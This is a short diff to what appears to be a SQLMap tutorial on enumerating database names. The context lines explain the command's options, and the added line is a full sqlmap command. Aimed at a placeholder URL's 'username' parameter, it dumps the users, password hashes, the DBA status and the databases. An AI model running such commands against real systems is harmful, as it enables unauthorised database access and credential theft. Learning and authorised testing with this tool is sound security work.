@@ -16,3 +16,6 @@ Enumerating Database Names:
 Command Explained:
 –url:  The vulnerable application’s URL –dbs: SQLMap option for database enumeration
 –cookie: Session cookie to maintain access while attacking
+===================================================================================================
+
+sqlmap --url="<url>" -p username --user-agent=SQLMAP --threads=10 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
